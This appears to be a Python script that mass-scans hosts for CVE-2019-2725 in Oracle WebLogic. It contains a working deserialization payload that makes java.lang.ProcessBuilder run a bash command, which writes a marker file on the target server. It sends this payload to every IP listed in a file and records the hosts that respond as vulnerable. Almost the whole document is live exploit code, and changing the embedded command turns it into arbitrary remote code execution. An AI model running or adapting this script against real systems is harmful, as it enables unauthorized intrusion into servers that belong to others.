cve-2019-2725.py

#code by djj
#Date 2019/5/10
import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
    "Cache-Control": "max-age=0",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Connection": "close",
    "content-type": "text/xml"
}

payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>echo"just test" -d > /root/Oracle/Middleware/user_projects/domains/base_domain/success.txt
</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>'''



def post_html():
    f = open('ip.txt')
    for line in f.readlines():
        try:
            path = '/_async/AsyncResponseService'
            url = 'http://' + line.replace('\n', '') + path
            resp = requests.post(url, data=payload, headers=headers,timeout = 5)
            print(url)
            if resp.status_code == 202:
                print('目标存在漏洞!结果已保存至ok.txt')
                with open('ok.txt','a') as f:
                    f.write(url + '\n')
            else:
                print( '漏洞不存在或已修复!')
            print('------------------------------------------------------')
        except Exception:
            print('请求超时!')
            print('---------')
            pass

def scan():
    print('''

+----------------------------------+
    cve-2019-2725批量检测工具      
+----------------------------------+
''')

if __name__ == '__main__':
    scan()
    post_html()